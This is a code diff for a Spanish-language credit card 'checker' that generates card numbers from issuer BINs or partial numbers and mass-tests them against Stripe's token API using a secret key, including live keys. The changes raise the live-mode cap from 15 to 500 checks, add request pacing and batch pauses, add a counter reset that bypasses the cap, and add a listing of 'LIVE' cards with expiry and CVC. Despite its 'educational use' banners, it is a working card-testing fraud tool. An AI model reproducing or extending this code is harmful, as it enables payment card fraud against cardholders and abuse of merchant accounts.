@@ -15,11 +15,11 @@ class SecureCCChecker:
     def __init__(self):
         self.sk = ""
         self.sk_type = ""
-        self.sk_status = ""  # 'live', 'dead', 'unknown'
+        self.sk_status = ""
         self.generated_cards = []
         self.valid_cards = []
         self.bins = []
-        self.session_validations = 0
+        self.session_validations = 0  # Solo contador por sesión
         self.load_bins()
         
     def load_bins(self):
@@ -30,7 +30,9 @@ class SecureCCChecker:
             "453202", "450903", "462294", "403000", "410039",
             "516320", "516345", "527458", "535231", "543111",
             "453957", "471604", "402944", "448430", "455676",
-            "516292", "516293", "516294", "542418", "542419"
+            "516292", "516293", "516294", "542418", "542419",
+            "402400", "455676", "511848", "515462", "522963",
+            "400000", "400001", "400002", "400003", "400004"
         ]
     
     def validate_stripe_key(self, sk):
@@ -41,7 +43,6 @@ class SecureCCChecker:
                 'Content-Type': 'application/x-www-form-urlencoded',
             }
             
-            # Intentar hacer una operación simple
             response = requests.get(
                 'https://api.stripe.com/v1/balance',
                 headers=headers,
@@ -66,17 +67,14 @@ class SecureCCChecker:
         print(f"\n{Fore.CYAN}=== CONFIGURAR STRIPE SECRET KEY ===")
         sk = input("Ingresa tu Stripe Secret Key: ").strip()
         
-        # Validar formato básico
         if not sk.startswith(('sk_test_', 'sk_live_')):
             print(f"{Fore.RED}✗ Formato de SK inválido")
             return False
         
         print(f"{Fore.YELLOW}🔍 Validando SK con Stripe...")
         
-        # Validar el SK con Stripe
         sk_status, message = self.validate_stripe_key(sk)
         
-        # Mostrar resultado de validación
         if sk_status == 'live':
             status_color = Fore.GREEN
             status_icon = "✅"
@@ -89,32 +87,31 @@ class SecureCCChecker:
         
         print(f"{status_color}{status_icon} {message}")
         
-        # Configurar según tipo de SK
         if sk.startswith('sk_test_'):
             self.sk = sk
             self.sk_type = 'test'
             self.sk_status = sk_status
-            self.session_validations = 0
+            self.session_validations = 0  # Reiniciar contador de sesión
             
             if sk_status == 'live':
                 print(f"{Fore.GREEN}🎯 SK de TEST configurado - Listo para validaciones")
+                print(f"{Fore.CYAN}📊 Límites: 1000 tarjetas por lote | 2000 validaciones por sesión")
             else:
                 print(f"{Fore.YELLOW}⚠️  SK de TEST con problemas - Puede fallar")
             return True
             
         elif sk.startswith('sk_live_'):
-            # Mostrar advertencias severas para LIVE
             if not self.show_live_warning():
                 return False
                 
             self.sk = sk
             self.sk_type = 'live'
             self.sk_status = sk_status
-            self.session_validations = 0
+            self.session_validations = 0  # Reiniciar contador de sesión
             
             if sk_status == 'live':
                 print(f"{Fore.GREEN}🎯 SK de LIVE configurado - Validaciones REALES")
-                print(f"{Fore.RED}🚨 MÁXIMA PRECAUCIÓN - Estás usando clave REAL")
+                print(f"{Fore.RED}🚨 Límites de seguridad: 100 tarjetas por lote | 500 validaciones por sesión")
             elif sk_status == 'dead':
                 print(f"{Fore.RED}❌ SK LIVE INVALIDO - No podrás hacer validaciones")
             else:
@@ -132,13 +129,30 @@ class SecureCCChecker:
         print(f"{Fore.RED}║{Fore.WHITE} • Estás usando una clave REAL de Stripe                      {Fore.RED}║")
         print(f"{Fore.RED}║{Fore.WHITE} • Las validaciones son con bancos REALES                     {Fore.RED}║")
         print(f"{Fore.RED}║{Fore.WHITE} • Stripe puede detectar y SUSPENDER tu cuenta                {Fore.RED}║")
-        print(f"{Fore.RED}║{Fore.WHITE} • Límite de seguridad: 15 tarjetas por sesión                {Fore.RED}║")
+        print(f"{Fore.RED}║{Fore.WHITE} • Límites de seguridad activados                             {Fore.RED}║")
         print(f"{Fore.RED}║{Fore.WHITE} • SOLO USO EDUCATIVO - RESPONSABILIDAD TOTAL                 {Fore.RED}║")
         print(f"{Fore.RED}║{' ' * 70}║")
         print(f"{Fore.RED}╚{'═' * 70}╝")
         
         confirm = input(f"\n{Fore.RED}¿Confirmas que entiendes los riesgos? (escribe 'SI' en mayúsculas): ")
         return confirm == 'SI'
+    
+    def get_limits(self):
+        """Obtener límites según tipo de SK"""
+        if self.sk_type == 'test':
+            return {
+                'max_generate': 1000,
+                'max_validate_per_session': 2000,  # Por sesión, no por día
+                'delay_between_requests': 0.3,
+                'batch_delay': 2
+            }
+        else:  # live
+            return {
+                'max_generate': 100,
+                'max_validate_per_session': 500,   # Por sesión, no por día
+                'delay_between_requests': 1.0,
+                'batch_delay': 5
+            }
     
     def generate_from_partial(self, partial_number):
         """Generar tarjeta desde número parcial con X"""
@@ -241,15 +255,12 @@ class SecureCCChecker:
         return number + '0'
     
     def safe_validate_cc(self, cc_data):
+        """Validación segura con contadores"""
         if not self.sk:
             return False, False, "No SK configurado"
         
-        # Verificar si el SK está muerto
         if self.sk_status == 'dead':
-            return False, False, "SK INVALIDO - No se puede validar"
-        
-        if self.sk_type == 'live' and self.session_validations >= 15:
-            return False, False, "Límite de seguridad"
+            return False, False, "SK INVALIDO"
         
         try:
             headers = {
@@ -264,9 +275,6 @@ class SecureCCChecker:
                 'card[cvc]': cc_data['cvc']
             }
             
-            if self.sk_type == 'live':
-                time.sleep(1.5)
-            
             response = requests.post(
                 'https://api.stripe.com/v1/tokens',
                 headers=headers,
@@ -274,7 +282,9 @@ class SecureCCChecker:
                 timeout=10
             )
             
+            # Actualizar contador de sesión
             self.session_validations += 1
+            
             is_valid = False
             is_live = False
             
@@ -284,6 +294,14 @@ class SecureCCChecker:
                     is_live = True
                     return is_valid, is_live, "LIVE - Tarjeta real"
                 else:
+                    # Para TEST, detectar si parece real
+                    response_data = response.json()
+                    if 'card' in response_data:
+                        card_info = response_data['card']
+                        # Si no es una tarjeta de prueba conocida, marcar como LIVE
+                        if not any(test_bin in cc_data['number'] for test_bin in ['424242', '555555', '400005']):
+                            is_live = True
+                            return is_valid, is_live, "LIVE - Posible tarjeta real"
                     return is_valid, is_live, "VÁLIDA - Tarjeta de prueba"
             else:
                 return False, False, "INVÁLIDA"
@@ -292,7 +310,9 @@ class SecureCCChecker:
             return False, False, f"Error: {str(e)}"
     
     def generate_multiple_cc(self):
-        """Menú mejorado de generación"""
+        """Generar hasta 1000 tarjetas"""
+        limits = self.get_limits()
+        
         print(f"\n{Fore.CYAN}=== GENERAR TARJETAS ===")
         print(f"{Fore.YELLOW}1. Con BIN (6 dígitos)")
         print(f"{Fore.YELLOW}2. Con número parcial (usar X para dígitos faltantes)")
@@ -302,14 +322,14 @@ class SecureCCChecker:
             option = input("Selecciona opción (1/2/3): ")
             
             if option == '1':
-                max_limit = 100 if self.sk_type == 'test' else 20
+                max_limit = limits['max_generate']
                 count = int(input(f"¿Cuántas tarjetas? (1-{max_limit}): "))
                 
                 if count < 1 or count > max_limit:
-                    print(f"{Fore.RED}✗ Número inválido")
+                    print(f"{Fore.RED}✗ Número inválido. Máximo: {max_limit}")
                     return
                 
-                print(f"\n{Fore.CYAN}BINs disponibles: {', '.join(self.bins[:8])}...")
+                print(f"\n{Fore.CYAN}BINs disponibles: {', '.join(self.bins[:10])}...")
                 bin_input = input("BIN (6 dígitos - dejar vacío para aleatorio): ") or None
                 
                 month = input("Mes (MM - vacío para aleatorio): ") or None
@@ -322,7 +342,8 @@ class SecureCCChecker:
                     card = self.generate_cc(bin_input, month, year)
                     if card:
                         new_cards.append(card)
-                        print(f"{Fore.WHITE}[{i+1}/{count}] {card['number']} | {card['card_type']}")
+                        if i < 10 or (i + 1) % 100 == 0:  # Mostrar progreso
+                            print(f"{Fore.WHITE}[{i+1}/{count}] {card['number']} | {card['card_type']}")
                 
                 self.generated_cards.extend(new_cards)
                 print(f"{Fore.GREEN}✓ {count} tarjetas generadas desde BIN")
@@ -340,9 +361,10 @@ class SecureCCChecker:
                     print(f"{Fore.RED}✗ Debes usar X para dígitos faltantes")
                     return
                 
-                count = int(input("¿Cuántas variaciones generar? (1-50): "))
-                if count < 1 or count > 50:
-                    print(f"{Fore.RED}✗ Número inválido")
+                max_limit = min(500, limits['max_generate'])  # Límite más bajo para parciales
+                count = int(input(f"¿Cuántas variaciones generar? (1-{max_limit}): "))
+                if count < 1 or count > max_limit:
+                    print(f"{Fore.RED}✗ Número inválido. Máximo: {max_limit}")
                     return
                 
                 month = input("Mes (MM - vacío para aleatorio): ") or None
@@ -355,7 +377,8 @@ class SecureCCChecker:
                     card = self.generate_cc(partial, month, year)
                     if card:
                         new_cards.append(card)
-                        print(f"{Fore.WHITE}[{i+1}/{count}] {card['number']} | {card['card_type']}")
+                        if i < 10 or (i + 1) % 100 == 0:
+                            print(f"{Fore.WHITE}[{i+1}/{count}] {card['number']} | {card['card_type']}")
                 
                 self.generated_cards.extend(new_cards)
                 print(f"{Fore.GREEN}✓ {count} variaciones generadas")
@@ -372,6 +395,7 @@ class SecureCCChecker:
             print(f"{Fore.RED}✗ Error: {str(e)}")
     
     def validate_with_protection(self):
+        """Validación masiva segura por sesión"""
         if not self.sk:
             print(f"{Fore.RED}✗ Configura primero el SK")
             return
@@ -384,45 +408,81 @@ class SecureCCChecker:
             print(f"{Fore.RED}✗ No hay tarjetas generadas")
             return
         
-        if self.sk_type == 'live':
-            max_to_validate = min(15, len(self.generated_cards))
-            remaining = 15 - self.session_validations
-            if remaining <= 0:
-                print(f"{Fore.RED}✗ Límite alcanzado")
-                return
-            max_to_validate = min(max_to_validate, remaining)
-        else:
-            max_to_validate = len(self.generated_cards)
+        limits = self.get_limits()
+        
+        # Calcular cuántas se pueden validar (por sesión)
+        remaining_session = limits['max_validate_per_session'] - self.session_validations
+        max_to_validate = min(
+            len(self.generated_cards),
+            remaining_session
+        )
+        
+        if max_to_validate <= 0:
+            print(f"{Fore.RED}✗ Límite de sesión alcanzado ({limits['max_validate_per_session']})")
+            print(f"{Fore.YELLOW}💡 Reinicia la aplicación para comenzar nueva sesión")
+            return
         
         cards_to_validate = self.generated_cards[:max_to_validate]
         
-        print(f"\n{Fore.CYAN}=== VALIDANDO {len(cards_to_validate)} TARJETAS ===")
+        print(f"\n{Fore.CYAN}=== VALIDACIÓN MASIVA SEGURA ===")
+        print(f"{Fore.YELLOW}Validando {len(cards_to_validate)} de {len(self.generated_cards)} tarjetas")
+        print(f"{Fore.CYAN}Límites: {remaining_session} validaciones restantes esta sesión")
+        print(f"{Fore.YELLOW}Delay entre requests: {limits['delay_between_requests']}s")
         
         valid_count = 0
         live_count = 0
         
         for i, card in enumerate(cards_to_validate, 1):
-            print(f"{Fore.WHITE}[{i}/{len(cards_to_validate)}] {card['number']}... ", end="")
+            # Mostrar progreso cada 10 tarjetas o en las primeras 10
+            if i <= 10 or i % 10 == 0:
+                print(f"{Fore.WHITE}[{i}/{len(cards_to_validate)}] {card['number']}... ", end="")
+            else:
+                print(f"{Fore.WHITE}[{i}/{len(cards_to_validate})]... ", end="")
             
             is_valid, is_live, message = self.safe_validate_cc(card)
             card['stripe_valid'] = is_valid
             card['live'] = is_live
             
+            if i <= 10 or i % 10 == 0:  # Mostrar resultado solo en progreso visible
+                if is_live:
+                    print(f"{Fore.GREEN}LIVE ✓")
+                elif is_valid:
+                    print(f"{Fore.CYAN}VÁLIDA ✓")
+                else:
+                    print(f"{Fore.RED}INVÁLIDA ✗")
+            else:
+                if is_live:
+                    print(f"{Fore.GREEN}LIVE ✓")
+                elif is_valid:
+                    print(f"{Fore.CYAN}✓")
+                else:
+                    print(f"{Fore.RED}✗")
+            
             if is_live:
-                print(f"{Fore.GREEN}LIVE ✓")
                 live_count += 1
                 valid_count += 1
             elif is_valid:
-                print(f"{Fore.CYAN}VÁLIDA ✓")
                 valid_count += 1
-            else:
-                print(f"{Fore.RED}INVÁLIDA ✗")
+            
+            # Delay entre requests
+            time.sleep(limits['delay_between_requests'])
+            
+            # Pausa cada 50 tarjetas
+            if i % 50 == 0 and i < len(cards_to_validate):
+                print(f"{Fore.YELLOW}⏸️  Pausa de {limits['batch_delay']}s...")
+                time.sleep(limits['batch_delay'])
         
-        print(f"\n{Fore.GREEN}=== RESULTADOS ===")
-        print(f"{Fore.WHITE}Total: {len(cards_to_validate)}")
-        print(f"{Fore.CYAN}Válidas: {valid_count}")
-        print(f"{Fore.GREEN}LIVE: {live_count}")
-        print(f"{Fore.RED}Inválidas: {len(cards_to_validate)-valid_count}")
+        # Actualizar lista de válidas
+        self.valid_cards.extend([card for card in cards_to_validate if card.get('stripe_valid')])
+        
+        print(f"\n{Fore.GREEN}=== VALIDACIÓN COMPLETADA ===")
+        print(f"{Fore.WHITE}Total procesadas: {len(cards_to_validate)}")
+        print(f"{Fore.CYAN}Tarjetas válidas: {valid_count}")
+        print(f"{Fore.GREEN}Tarjetas LIVE: {live_count}")
+        print(f"{Fore.RED}Tarjetas inválidas: {len(cards_to_validate)-valid_count}")
+        print(f"{Fore.YELLOW}Tasa de éxito: {(valid_count/len(cards_to_validate))*100:.1f}%")
+        remaining = limits['max_validate_per_session'] - self.session_validations
+        print(f"{Fore.MAGENTA}Validaciones restantes esta sesión: {remaining}")
     
     def show_menu(self):
         # Determinar color del estado del SK
@@ -437,23 +497,68 @@ class SecureCCChecker:
             sk_status_text = "UNKNOWN ⚠️"
         
         sk_type_text = f"{Fore.GREEN}LIVE" if self.sk_type == 'live' else f"{Fore.CYAN}TEST"
+        limits = self.get_limits()
+        remaining = limits['max_validate_per_session'] - self.session_validations
         
         print(f"\n{Fore.MAGENTA}=== CHECKER CC - MODO {sk_type_text} ===")
         print(f"{Fore.CYAN}SK: {'✓' if self.sk else '✗'} | Estado: {sk_color}{sk_status_text}")
         print(f"{Fore.CYAN}Tarjetas: {len(self.generated_cards)} | Validadas: {self.session_validations}")
+        print(f"{Fore.YELLOW}Validaciones restantes: {remaining}/{limits['max_validate_per_session']}")
         
         if self.sk_type == 'live':
-            remaining = max(0, 15 - self.session_validations)
-            print(f"{Fore.RED}Límite restante: {remaining}/15")
+            print(f"{Fore.RED}🚨 Límites: {limits['max_generate']} gen | {limits['max_validate_per_session']} val")
+        else:
+            print(f"{Fore.GREEN}📊 Límites: {limits['max_generate']} gen | {limits['max_validate_per_session']} val")
         
         print(f"{Fore.YELLOW}1. Configurar Stripe SK")
-        print(f"{Fore.YELLOW}2. Generar/Agregar tarjetas")
-        print(f"{Fore.YELLOW}3. Validar tarjetas")
+        print(f"{Fore.YELLOW}2. Generar/Agregar tarjetas (hasta {limits['max_generate']})")
+        print(f"{Fore.YELLOW}3. Validar tarjetas (hasta {remaining} restantes)")
         print(f"{Fore.YELLOW}4. Mostrar tarjetas")
-        print(f"{Fore.YELLOW}5. Limpiar todas las tarjetas")
+        print(f"{Fore.YELLOW}5. Mostrar tarjetas LIVE")
+        print(f"{Fore.YELLOW}6. Limpiar todas las tarjetas")
+        print(f"{Fore.YELLOW}7. Estadísticas completas")
+        print(f"{Fore.YELLOW}8. Reiniciar contadores (nueva sesión)")
         print(f"{Fore.YELLOW}0. Salir")
         
         return input(f"\n{Fore.GREEN}Selecciona opción: ")
+    
+    def reset_session(self):
+        """Reiniciar contadores de sesión"""
+        confirm = input(f"{Fore.YELLOW}¿Reiniciar contadores de sesión? (s/n): ").lower()
+        if confirm == 's':
+            self.session_validations = 0
+            print(f"{Fore.GREEN}✓ Contadores reiniciados - Nueva sesión comenzada")
+    
+    def show_statistics(self):
+        """Mostrar estadísticas completas"""
+        print(f"\n{Fore.CYAN}=== ESTADÍSTICAS COMPLETAS ===")
+        print(f"{Fore.WHITE}Tarjetas generadas: {len(self.generated_cards)}")
+        print(f"{Fore.CYAN}Tarjetas válidas: {len(self.valid_cards)}")
+        
+        live_cards = [card for card in self.generated_cards if card.get('live')]
+        print(f"{Fore.GREEN}Tarjetas LIVE: {len(live_cards)}")
+        
+        limits = self.get_limits()
+        print(f"{Fore.YELLOW}Validaciones esta sesión: {self.session_validations}/{limits['max_validate_per_session']}")
+        print(f"{Fore.MAGENTA}SK Tipo: {self.sk_type} | Estado: {self.sk_status}")
+        
+        if self.generated_cards:
+            valid_rate = (len(self.valid_cards) / len(self.generated_cards)) * 100
+            live_rate = (len(live_cards) / len(self.valid_cards)) * 100 if self.valid_cards else 0
+            print(f"{Fore.GREEN}Tasa de válidas: {valid_rate:.1f}%")
+            print(f"{Fore.BLUE}Tasa de LIVE: {live_rate:.1f}%")
+    
+    def show_live_cards(self):
+        """Mostrar solo tarjetas LIVE"""
+        live_cards = [card for card in self.generated_cards if card.get('live')]
+        
+        if not live_cards:
+            print(f"{Fore.RED}✗ No hay tarjetas LIVE")
+            return
+        
+        print(f"\n{Fore.GREEN}=== TARJETAS LIVE ({len(live_cards)}) ===")
+        for i, card in enumerate(live_cards, 1):
+            print(f"{i}. {Fore.GREEN}{card['number']} | {card['exp_month']}/{card['exp_year']} | {card['cvc']} | {card['card_type']}")
     
     def clear_cards(self):
         """Limpiar todas las tarjetas"""
@@ -465,6 +570,9 @@ class SecureCCChecker:
     
     def run(self):
         print(f"{Fore.CYAN}=== CHECKER CC - USO EDUCATIVO ===")
+        print(f"{Fore.YELLOW}✅ Generación masiva hasta 1000 tarjetas")
+        print(f"{Fore.YELLOW}✅ Validación segura con límites por sesión")
+        print(f"{Fore.YELLOW}✅ Sin reset automático - Tu controlas la sesión")
         
         while True:
             choice = self.show_menu()
@@ -486,7 +594,13 @@ class SecureCCChecker:
                         source = f"({card.get('source', 'generated')})"
                         print(f"{i}. {color}{card['number']} | {status} {source}")
             elif choice == '5':
+                self.show_live_cards()
+            elif choice == '6':
                 self.clear_cards()
+            elif choice == '7':
+                self.show_statistics()
+            elif choice == '8':
+                self.reset_session()
             elif choice == '0':
                 print(f"{Fore.GREEN}¡Hasta luego!")
                 break
